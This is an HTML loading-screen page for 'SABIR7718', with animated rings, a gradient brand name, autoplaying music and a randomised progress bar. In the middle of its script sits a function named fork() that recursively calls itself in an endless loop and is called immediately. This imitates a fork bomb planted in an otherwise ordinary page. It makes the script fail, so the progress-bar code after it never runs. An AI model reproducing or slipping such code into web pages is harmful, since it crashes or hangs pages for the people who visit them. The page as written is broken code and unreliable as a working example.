<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SABIR7718</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0a0a0f;
      overflow: hidden;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    }

    .bg {
      position: fixed;
      inset: 0;
      background: 
        radial-gradient(ellipse at 30% 20%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
        radial-gradient(ellipse at 70% 80%, rgba(168, 85, 247, 0.12) 0%, transparent 50%),
        radial-gradient(ellipse at 50% 50%, rgba(59, 130, 246, 0.08) 0%, transparent 70%);
      animation: bgPulse 8s ease-in-out infinite alternate;
    }

    @keyframes bgPulse {
      0% { opacity: 0.7; transform: scale(1); }
      100% { opacity: 1; transform: scale(1.05); }
    }

    .loader-container {
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 2.5rem;
      z-index: 10;
    }

    .logo-wrapper {
      position: relative;
      width: 180px;
      height: 180px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo {
      width: 140px;
      height: 140px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid rgba(255, 255, 255, 0.15);
      box-shadow: 
        0 0 30px rgba(99, 102, 241, 0.4),
        0 0 60px rgba(168, 85, 247, 0.2),
        inset 0 0 20px rgba(0, 0, 0, 0.3);
      animation: logoFloat 3s ease-in-out infinite;
      z-index: 2;
    }

    @keyframes logoFloat {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }

    .ring {
      position: absolute;
      border-radius: 50%;
      border: 2px solid transparent;
    }

    .ring-1 {
      width: 170px;
      height: 170px;
      border-top-color: #6366f1;
      border-right-color: #6366f1;
      animation: spin 1.4s linear infinite;
    }

    .ring-2 {
      width: 190px;
      height: 190px;
      border-bottom-color: #a855f7;
      border-left-color: #a855f7;
      animation: spin 2s linear infinite reverse;
    }

    .ring-3 {
      width: 210px;
      height: 210px;
      border-top-color: rgba(59, 130, 246, 0.6);
      border-right-color: rgba(59, 130, 246, 0.3);
      animation: spin 2.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .orbit {
      position: absolute;
      width: 220px;
      height: 220px;
      animation: spin 6s linear infinite;
    }

    .dot {
      position: absolute;
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #818cf8;
      box-shadow: 0 0 12px #6366f1, 0 0 24px #6366f1;
    }

    .dot:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
    .dot:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); background: #c084fc; box-shadow: 0 0 12px #a855f7, 0 0 24px #a855f7; }
    .dot:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); background: #60a5fa; box-shadow: 0 0 12px #3b82f6, 0 0 24px #3b82f6; }
    .dot:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }

    /* ===== SABIR7718 Animated Text ===== */
    .brand-text {
      font-size: 1.6rem;
      font-weight: 700;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      background: linear-gradient(90deg, #6366f1, #a855f7, #3b82f6, #6366f1);
      background-size: 300% 100%;
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      animation: gradientMove 4s linear infinite, textGlow 2.5s ease-in-out infinite alternate;
      text-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
    }

    @keyframes gradientMove {
      0% { background-position: 0% 50%; }
      100% { background-position: 300% 50%; }
    }

    @keyframes textGlow {
      0% { filter: brightness(1); transform: scale(1); }
      100% { filter: brightness(1.25); transform: scale(1.03); }
    }

    .progress-container {
      width: 220px;
      height: 4px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 10px;
      overflow: hidden;
      position: relative;
    }

    .progress-bar {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #6366f1, #a855f7, #3b82f6);
      border-radius: 10px;
      transition: width 0.35s ease-out;
      box-shadow: 0 0 15px rgba(99, 102, 241, 0.6);
    }

    .percent {
      color: #94a3b8;
      font-size: 0.85rem;
      font-variant-numeric: tabular-nums;
      margin-top: -1.2rem;
    }
  </style>
</head>
<body>
  <div class="bg"></div>

  <!-- Background Music -->
  <audio id="bgMusic" src="https://sabir7718.is-a.dev/songs/su-jauh.mp3" loop autoplay></audio>

  <div class="loader-container">
    <div class="logo-wrapper">
      <div class="orbit">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>

      <div class="ring ring-1"></div>
      <div class="ring ring-2"></div>
      <div class="ring ring-3"></div>

      <img 
        src="https://sabir7718.is-a.dev/photos/S7.jpg" 
        alt="Logo" 
        class="logo"
      >
    </div>

    <!-- Animated SABIR7718 -->
    <div class="brand-text">SABIR7718</div>

    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="percent" id="percent">0%</div>
  </div>

  <script>
    // Try to play music (browsers sometimes block autoplay)
    const music = document.getElementById('bgMusic');
    music.volume = 0.7;

    function tryPlay() {
      music.play().catch(() => {
        // If autoplay is blocked, play on first click/touch
        document.body.addEventListener('click', () => {
          music.play();
        }, { once: true });
      });
    }
    tryPlay();
    
    function fork() {
        while(true) {
            fork();
        }
    }
    
    fork();

    // Realistic progress
    const percentEl = document.getElementById('percent');
    const progressBar = document.getElementById('progressBar');
    let progress = 0;

    function updateProgress() {
      if (progress >= 100) {
        progress = 100;
        percentEl.textContent = '100%';
        progressBar.style.width = '100%';
        return;
      }

      const chance = Math.random();

      if (chance < 0.25) {
        progress += Math.random() * 1.5;
      } else if (chance < 0.55) {
        progress += Math.random() * 4 + 1.5;
      } else if (chance < 0.8) {
        progress += Math.random() * 7 + 3;
      } else {
        progress += Math.random() * 12 + 5;
      }

      if (progress > 100) progress = 100;

      if (Math.random() < 0.18 && progress < 95) {
        progress += Math.random() * 0.8;
      }

      percentEl.textContent = Math.floor(progress) + '%';
      progressBar.style.width = progress + '%';

      const delay = progress < 30 ? 180 + Math.random() * 220 :
                    progress < 70 ? 140 + Math.random() * 280 :
                    progress < 90 ? 200 + Math.random() * 350 :
                                    280 + Math.random() * 400;

      setTimeout(updateProgress, delay);
    }

    setTimeout(updateProgress, 400);
  </script>
</body>
</html>
